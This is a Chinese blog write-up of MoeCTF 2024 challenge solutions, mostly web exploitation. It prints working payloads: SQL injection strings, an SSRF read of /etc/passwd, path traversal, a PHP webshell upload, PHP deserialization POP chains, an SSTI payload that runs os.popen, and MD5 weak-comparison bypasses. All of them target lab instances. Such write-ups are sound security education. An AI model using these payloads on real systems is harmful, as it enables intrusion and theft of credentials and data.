+++
date = 2024-10-21T22:20:35+08:00
title = "MoeCTF 2024 解题小记（WP）"
description = "MoeCTF 2024 解题小记（WP）"
slug = "moectf-2024-writeup"
tags = ["CyberSecurity","Software"]
+++



![moectf2024](https://resources.starsac.cn/2024/10/moectf2024.webp)

### 0. 总结的一些做题思路

工具：BurpSuite，WRSX（西电CTF用），AntSword，御剑扫描工具，HackBar



index.phps查看php源码

字符串能和0弱比较相等

查看php相关信息可以用`phpinfo();`

### 1. 0基础入门

#### 1.1 在此签到

在QQ群绑定账号即可获得flag。

### 2. Web渗透测试与审计

#### 2.1 Web渗透测试与审计入门指北

在vm虚拟机中安装任意Linux发行版，安装宝塔面板部署网站，将题中附件放入网站目录，使用浏览器打开即可获得flag。

#### 2.2 弗拉格之地的入口

根据题目信息打开爬虫协议`/robot.txt`文件

```
# Robots.txt file for xdsec.org
# only robots can find the entrance of web-tutor
User-agent: *
Disallow: /webtutorEntry.php
```

再打开`/webtutorEntry.php`即可看到flag。

#### 2.3 垫刀之路01

输入`ls /`查看根目录下文件，发现`flag`和`flag.sh`。赶紧点开看看，使用cat命令查看后，好家伙被骗了，但是得到提示：看看环境变量。输入env命令查看环境变量即可得到flag。

#### 2.4 ez_http

按要求使用post和get提交参数，出现提示source must be....，修改请求头referer信息，记得放到host之后，出现提示setcookie，在Connection下面设置cookie即可。提示使用MoeDedicatedBrowser，把UserAgent设成这个就行。提示Local Access Only，改xff为127.0.0.1，之后就能得到flag了！！！

#### 2.5 ProveYourLove

笨方法，用代理拦截一次发出n多请求，点的我手疼hhh

#### 2.6 弗拉格之地的挑战

得到提示信息，在地址栏加上`/flag1ab.html`，打开第二个页面

右键查看页面源代码在注释中得到提示，得到flag1和下一步的url

```html
<!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下-->
<!--flag1: bW9lY3Rm-->
<!--下一步：/flag2hh.php-->
```

跳转到第二个页面，提示关键词http

打开BurpSuite抓包，在http响应头中发现flag2`e0FmdEV`和`nextpage: /flag3cad.php`，继续跳转，按提示用GET和POST传参，传参后出现提示要求Admin身份验证，继续抓包，发现`verify=user`，将其改为admin

得到`flag3: yX3RoMXN`，继续下一关，提示修改referer，抓包修改，注意将referer字段插入Host之后，其他位置无效。请求成功后，嗯？听声辩位哈哈哈，点击开始发现没有第九个按钮？，没关系，f12打开源代码借一个按钮当9就ok了，出现提示使用console.log，查看控制台得到`flag4: fdFVUMHJ`，继续跳转，提示输入I want flag，本来想着在前端把javaScript删掉完事，结果还不行，绕过前端直接post数据就ok了。`flag5: fSV90aDF`，继续跳转显示一段php代码，按照要求进行POST和GET，得到`flag6: rZV9VX2t`，最后一关，提示`eval($_POST['what']);`意为执行what参数中的值，使用POST执行Linux命令，在根目录下可得到flag7`rbm93X1dlQn0=`组合起来，最后的flag即为`bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=`通过base64解码可得到flag

#### 2.7 ImageCloud前置

SSRF题目文本框输入`file:///etc/passwd`即可看到flag

#### 2.8 垫刀之路02

非常简单，没有任何前后端限制，直接把php一句话木马上传进去就ok，控制台输出文件存储url，这么直球哈哈哈，中国蚁剑启动！（ps：真好用，之前做垫刀01的时候在那ls半天。。）按照题目提示env查看环境变量，即可找到flag

#### 2.9 垫刀之路03

和上题唯一的区别是加了文件类型验证，抓包修改文件后缀名为php即可。

#### 2.10 垫刀之路04

使用四个../翻到根目录，在tmp/中找到flag

#### 2.11 垫刀之路05

简单的sql注入，没有任何过滤，用户名和密码输入`'='`即可得到flag

#### 2.12 垫刀之路06

考察反序列化

```php
<?php
class A {
    // 注意 private 属性的序列化哦
    private $evil = 'env';

    // 如何赋值呢
    private $a = 'system';

   // function __destruct() {
      //  $s = $this->a;
      //  $s($this->evil);
    //}
}

class B {
    private $b;

    //function __invoke($c) {
      //  $s = $this->b;
       // $s($c);
    //}
}
$obj = new A();
echo urlencode(serialize($obj));
?>
```

构造这个代码，在线运行后作为data变量的值通过get传参（ps：经典的flag位置hh）

#### 2.13 垫刀之路07

url后面加console进入shell，输入pin码（竟然是对的hh），利用python命令在`/app`下找到flag文件

```python
import os
os.popen("SYSCMD").read()
```

#### 2.14 静态网页

通过`document.lastModified();`看出网页是伪静态的（ps：被bing误导了，一直以为是伪静态，其实跟伪静态没半毛钱关系）在源码中搜索flag，发现`"flag": "Please turn to final1l1l_challenge.php"`，跳转，发现又是一道源码审计题。。传入满足条件的a和b即可（字符串弱比较结果是0，坑死我了！！！）

```
?a=s155964671a(任意md5为0e开头的值)
b=0abcd(任意开头为0且不全为数字的值)
```

#### 2.15 电院_backend

使用路径扫描工具进行扫描，发现`/admin/`，访问发现登陆界面，查看附件源码，发现密码被md5加密，尝试从邮箱注入，正则表达式要求邮箱为`xxx@xxx.xxx`的格式,并且不能出现or，构造`a@a.a' || '1'='1' #`（#把后面的查询语句注释掉了）随便输入密码和验证码，得到flag。

#### 2.16 pop moe

代码审计题

```php
<?php

class class000 {
    private $payl0ad = '0';//跳过if
    protected $what = new class001();//要调用class001的invoke方法

    // public function __destruct()
    // {
    //     $this->check();
    // }

    // public function check()
    // {
    //     if($this->payl0ad === 0)
    //     {
    //         die('FAILED TO ATTACK');
    //     }
    //     $a = $this->what;
    //     $a();//此时会调用class001的invoke方法
    // }
}

class class001 {
    public $payl0ad = 'dangerous';
    public $a = new class002();
    // public function __invoke()
    // {
    //     $this->a->payload = $this->payl0ad;//把dangerous赋给class002的payload变量，相当于设置变量，会调用set方法
    // }
}

class class002 {
    private $sec = new class003();
    // public function __set($a, $b)//值是dangerous
    // {
    //     $this->$b($this->sec);//把b设置成dangerous，sec为new class003()返回mystr
    // }

    // public function dangerous($whaattt)
    // {
    //     $whaattt->evvval($this->sec);//$whaattt设置为class003，sec设置为new class003()，whaatt设置需要执行dangerous方法
    // }

}

class class003 {
    public $mystr = 'phpinfo();';//设置mystr为要执行rce的命令
    // public function evvval($str)
    // {
    //     eval($str);
    // }

    // public function __tostring()
    // {
    //     return $this->mystr;
    // }
}

echo serialize(new class000());

// if(isset($_GET['data']))
// {
//     $a = unserialize($_GET['data']);
// }
// else {
//     highlight_file(__FILE__);
// }
```

实测这样不行，要调用`__construct`方法，呜呜呜，修改一下

```php
<?php
class class000{
	public  $payl0ad;
	public  $what;

	public function __construct(){
		$this->payl0ad = '0';
		$this->what = new class001();
	}
}	
class class001{
	public $payl0ad;
	public $a;
	public function __construct(){
		$this->payl0ad = 'dangerous';
		$this->a = new class002();
	}
}
class class002{
	public $sec;
	public function __construct(){
		$this->sec = new class003();
	}
}
class class003{
	public $mystr;
	public function __construct(){
		$this->mystr = 'phpinfo();';
	}
}
echo serialize(new class000());
?>
```

得到输出

```
O:8:"class000":2:{s:7:"payl0ad";s:1:"0";s:4:"what";O:8:"class001":2:{s:7:"payl0ad";s:9:"dangerous";s:1:"a";O:8:"class002":1:{s:3:"sec";O:8:"class003":1:{s:5:"mystr";s:10:"phpinfo();";}}}}
```

通过get发送即可，在页面搜索flag即可找到。

#### 2.17 Who's blog?

ssti注入，使用hackbar内置的注入模板即可得到flag

```
?id={{self.__init__.__globals__.__builtins__['__import__']('os').popen('env').read()}}
```

#### 2.18 勇闯铜人阵

写脚本题（好难呜呜）gpt帮我，抓包发现点击回答按钮后会发送post请求，服务器随机返回1到2个数字，在3秒内拼接字符串直接通过post发送即可

```python
import requests

# 服务URL
url = "http://127.0.0.1:55165/"

# 初始化session对象
session = requests.Session()

# 方位数据
directions_single = ["北方", "东北方", "东方", "东南方", "南方", "西南方", "西方", "西北方"]
directions_double = [f"{d}一个" for d in directions_single]
prompts = ['1', '2', '3', '4', '5', '6', '7', '8']

# 初始数据
data_init = {
    'player': 1,
    'direct': '弟子明白'
}

try:
    # 发送初始POST请求
    response = session.post(url, data=data_init)
    response.raise_for_status()  # 检查请求是否成功

    # 重复过程5次
    for _ in range(5):
        # 提取消息中的最后8个字符作为提示
        msg = response.text[-30:-22]

        # 分析提示
        num = 0
        string = ''
        for char in msg:
            if char in prompts:
                num += 1
                string += char

        # 根据提示数量构建新的请求数据
        if num == 1:
            index = int(string) - 1
            direction_data = {
                'player': 1,
                'direct': directions_single[index]
            }
            print(f'Sending: {directions_single[index]}')
        elif num == 2:
            index1, index2 = int(string[0]) - 1, int(string[1]) - 1
            direction_data = {
                'player': 1,
                'direct': f'{directions_double[index1]}，{directions_double[index2]}'
            }
            print(f'Sending: {directions_double[index1]}，{directions_double[index2]}')
        else:
            raise ValueError("Unexpected number of prompts: {}".format(num))

        # 发送新请求
        response = session.post(url, data=direction_data)
        response.raise_for_status()
        print(response.text)

except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
```

#### 2.19 ImageCloud

审计代码，发现点击上传图片之后会自动生成一个5000端口的url和一个端口在（5001，6000）随机的url，利用burpSuite进行爆破，发现5039端口响应长度不同，将端口号改为5039，在`http://127.0.0.1:49265/image?url=http://localhost:5039/image/flag.jpg`下发现flag图片（还要OCR，不能直接复制呜呜呜）

flag：moectf{CeTTebRaT3-YoU_4tt@CK-to_mY-tMAGE-Ct0UDHHHhhh355}

### 3. 安全杂项

#### 3.1 杂项入门指北

观察海报右侧发现摩尔斯密码，在线解密后得到flag，使用`moectf{}`包裹提交即可

#### 3.2 signin

按照提示签到即可

#### 3.3 罗小黑战记

拆分gif为帧图片，出现二维码，扫码即可获得flag

#### 3.4 ez_F5

按照题目提示使用F5隐写软件解码即可[repo](https://github.com/matthewgao/F5-steganography)，注意要使用java8，高版本的jdk会报错，密码见图片文件属性，使用base32解码即可得到

`java Extract <file> -p no_password`在output.txt发现flag